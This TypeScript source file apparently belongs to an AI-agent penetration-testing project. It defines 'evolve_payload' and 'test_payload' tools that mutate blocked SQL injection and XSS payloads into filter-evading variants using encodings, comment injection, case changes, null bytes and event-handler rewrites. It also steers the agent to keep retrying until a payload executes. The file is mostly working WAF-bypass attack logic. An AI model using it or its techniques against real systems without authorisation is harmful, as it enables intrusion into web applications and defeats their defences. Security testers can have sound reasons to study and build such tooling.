// Copyright (C) 2026 Ghost Hacker Contributors
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU Affero General Public License version 3
// as published by the Free Software Foundation.

/**
 * Payload Evolution MCP Tools
 *
 * Genetic algorithm-inspired payload mutation system. When a payload gets
 * blocked by a WAF or filter, the agent calls evolve_payload to generate
 * mutated variants that may bypass defenses.
 *
 * - evolve_payload: Mutate a blocked payload into N variants
 * - test_payload: Record a payload test result for learning
 */

import { tool } from '@anthropic-ai/claude-agent-sdk';
import { z } from 'zod';
import { createToolResult, type ToolResult } from '../types/tool-responses.js';

// ============================================================================
// Mutation Strategies
// ============================================================================

type MutationStrategy = (payload: string) => string;

const MUTATION_STRATEGIES: Record<string, MutationStrategy> = {
  // Encoding mutations
  'url-encode': (p) => encodeURIComponent(p),
  'double-url-encode': (p) => encodeURIComponent(encodeURIComponent(p)),
  'html-entity': (p) => p.replace(/[<>"'&]/g, (c) => `&#${c.charCodeAt(0)};`),
  'unicode-escape': (p) => p.split('').map(c => c.charCodeAt(0) > 127 ? c : `\\u00${c.charCodeAt(0).toString(16).padStart(2, '0')}`).join(''),

  // Case mutations
  'alternating-case': (p) => p.split('').map((c, i) => i % 2 === 0 ? c.toUpperCase() : c.toLowerCase()).join(''),
  'random-case': (p) => p.split('').map(c => Math.random() > 0.5 ? c.toUpperCase() : c.toLowerCase()).join(''),

  // SQL comment injection
  'sql-inline-comment': (p) => p.replace(/\s+/g, '/**/'),
  'sql-multiline-comment': (p) => p.replace(/\s+/g, '/*!*/'),
  'sql-version-comment': (p) => p.replace(/(UNION|SELECT|FROM|WHERE|AND|OR)/gi, (m) => `/*!50000${m}*/`),

  // Whitespace manipulation
  'tab-substitution': (p) => p.replace(/\s/g, '\t'),
  'newline-substitution': (p) => p.replace(/\s/g, '\n'),
  'null-byte-prefix': (p) => `%00${p}`,

  // Structural transforms (SQL)
  'union-to-subquery': (p) => p.replace(/UNION\s+SELECT/gi, 'UNION ALL SELECT'),
  'or-to-double-negative': (p) => p.replace(/\bOR\b/gi, 'AND NOT NOT'),
  'quote-to-hex': (p) => p.replace(/'/g, '0x27').replace(/"/g, '0x22'),
  'concat-split': (p) => {
    // Split string literals using CONCAT
    return p.replace(/'([^']+)'/g, (_match, str: string) => {
      if (str.length <= 2) return `'${str}'`;
      const mid = Math.floor(str.length / 2);
      return `CONCAT('${str.slice(0, mid)}','${str.slice(mid)}')`;
    });
  },

  // XSS mutations
  'xss-svg-onload': (p) => p.replace(/<script>/gi, '<svg/onload=').replace(/<\/script>/gi, '>'),
  'xss-img-onerror': (p) => p.replace(/<script>([^<]*)<\/script>/gi, '<img src=x onerror=$1>'),
  'xss-event-handler': (p) => p.replace(/<script>/gi, '<body onload="').replace(/<\/script>/gi, '">'),
  'xss-javascript-uri': (p) => p.replace(/<script>([^<]*)<\/script>/gi, '<a href="javascript:$1">click</a>'),

  // Encoding chain mutations
  'base64-encode': (p) => Buffer.from(p).toString('base64'),
  'hex-encode': (p) => p.split('').map(c => `%${c.charCodeAt(0).toString(16).padStart(2, '0')}`).join(''),
};

function applyMutation(payload: string, strategy: string): string | null {
  const mutator = MUTATION_STRATEGIES[strategy];
  if (!mutator) return null;
  try {
    return mutator(payload);
  } catch {
    return null;
  }
}

function selectStrategies(context: string, vulnType: string): string[] {
  const strategies: string[] = [];

  // Always include encoding strategies
  strategies.push('url-encode', 'double-url-encode');

  if (vulnType === 'injection' || context.includes('sql')) {
    strategies.push(
      'sql-inline-comment', 'sql-multiline-comment', 'sql-version-comment',
      'union-to-subquery', 'or-to-double-negative', 'quote-to-hex',
      'concat-split', 'tab-substitution', 'alternating-case'
    );
  }

  if (vulnType === 'xss') {
    strategies.push(
      'xss-svg-onload', 'xss-img-onerror', 'xss-event-handler',
      'xss-javascript-uri', 'html-entity', 'unicode-escape',
      'alternating-case'
    );
  }

  if (context.includes('waf') || context.includes('blocked') || context.includes('filter')) {
    strategies.push(
      'null-byte-prefix', 'newline-substitution',
      'double-url-encode', 'hex-encode'
    );
  }

  // Deduplicate
  return [...new Set(strategies)];
}

// ============================================================================
// MCP Tools
// ============================================================================

const EvolvePayloadSchema = z.object({
  original_payload: z.string().describe('The payload that was blocked or filtered'),
  vuln_type: z.string().describe('Vulnerability type: injection, xss, ssrf, auth, authz'),
  block_reason: z.string().optional().describe('How the payload was blocked: e.g., "WAF 403 response", "input filtered", "CSP blocked"'),
  target_context: z.string().optional().describe('Context about the target: e.g., "express+mysql", "php+waf", "react+cloudflare"'),
  num_variants: z.number().optional().describe('Number of variants to generate (default: 8, max: 20)'),
});

function createEvolvePayloadHandler() {
  return async function evolvePayload(args: z.infer<typeof EvolvePayloadSchema>): Promise<ToolResult> {
    try {
      const numVariants = Math.min(args.num_variants || 8, 20);
      const context = [args.block_reason || '', args.target_context || ''].join(' ').toLowerCase();
      const strategies = selectStrategies(context, args.vuln_type);

      const variants: { strategy: string; payload: string; description: string }[] = [];

      for (const strategy of strategies) {
        if (variants.length >= numVariants) break;

        const mutated = applyMutation(args.original_payload, strategy);
        if (mutated && mutated !== args.original_payload) {
          variants.push({
            strategy,
            payload: mutated,
            description: `Mutation: ${strategy}`,
          });
        }
      }

      // Generate combo mutations (apply 2 strategies)
      if (variants.length < numVariants && strategies.length >= 2) {
        for (let i = 0; i < strategies.length && variants.length < numVariants; i++) {
          for (let j = i + 1; j < strategies.length && variants.length < numVariants; j++) {
            const first = applyMutation(args.original_payload, strategies[i]);
            if (first) {
              const combo = applyMutation(first, strategies[j]);
              if (combo && combo !== args.original_payload && combo !== first) {
                variants.push({
                  strategy: `${strategies[i]} + ${strategies[j]}`,
                  payload: combo,
                  description: `Combo mutation: ${strategies[i]} then ${strategies[j]}`,
                });
              }
            }
          }
        }
      }

      return createToolResult({
        status: 'success',
        message: `Generated ${variants.length} mutated payload variant(s) from ${strategies.length} applicable strategies. Try each variant and use record_technique to log results.`,
        variants,
        original: args.original_payload,
        strategies_applied: strategies,
      } as any);
    } catch (error) {
      return createToolResult({
        status: 'error',
        message: `Failed to evolve payload: ${error instanceof Error ? error.message : String(error)}`,
        errorType: 'PayloadEvolutionError',
        retryable: false,
      });
    }
  };
}

const TestPayloadSchema = z.object({
  payload: z.string().describe('The payload that was tested'),
  vuln_type: z.string().describe('Vulnerability type'),
  result: z.enum(['blocked', 'filtered', 'executed', 'error', 'timeout']).describe('Outcome of the test'),
  response_code: z.number().optional().describe('HTTP response code'),
  response_snippet: z.string().optional().describe('Relevant snippet from the response'),
  defense_detected: z.string().optional().describe('Defense mechanism detected: WAF name, filter type, etc.'),
});

function createTestPayloadHandler() {
  return async function testPayload(args: z.infer<typeof TestPayloadSchema>): Promise<ToolResult> {
    try {
      const analysis = {
        payload: args.payload,
        result: args.result,
        response_code: args.response_code,
        defense: args.defense_detected,
        recommendation: '',
      };

      switch (args.result) {
        case 'blocked':
          analysis.recommendation = 'Try evolve_payload with the block reason to generate bypass variants.';
          break;
        case 'filtered':
          analysis.recommendation = 'Input was sanitized. Try encoding mutations or structural transforms.';
          break;
        case 'executed':
          analysis.recommendation = 'Payload executed successfully! Use record_technique to store this winning payload.';
          break;
        case 'error':
          analysis.recommendation = 'Application error may indicate partial injection. Try adjusting payload syntax.';
          break;
        case 'timeout':
          analysis.recommendation = 'Timeout may indicate time-based blind injection. Adjust timing parameters.';
          break;
      }

      return createToolResult({
        status: 'success',
        message: `Payload test result: ${args.result}. ${analysis.recommendation}`,
        analysis,
      } as any);
    } catch (error) {
      return createToolResult({
        status: 'error',
        message: `Failed to process payload test: ${error instanceof Error ? error.message : String(error)}`,
        errorType: 'PayloadTestError',
        retryable: false,
      });
    }
  };
}

/**
 * Create evolve_payload MCP tool
 */
export function createEvolvePayloadTool() {
  return tool(
    'evolve_payload',
    'When a payload gets blocked by a WAF or filter, this tool generates mutated variants using encoding, case manipulation, comment injection, unicode substitution, and structural transformation. Try the variants and record which ones bypass defenses.',
    EvolvePayloadSchema.shape,
    createEvolvePayloadHandler()
  );
}

/**
 * Create test_payload MCP tool
 */
export function createTestPayloadTool() {
  return tool(
    'test_payload',
    'Record the result of testing a payload against the target. Reports whether it was blocked, filtered, executed, errored, or timed out, and provides recommendations for next steps.',
    TestPayloadSchema.shape,
    createTestPayloadHandler()
  );
}
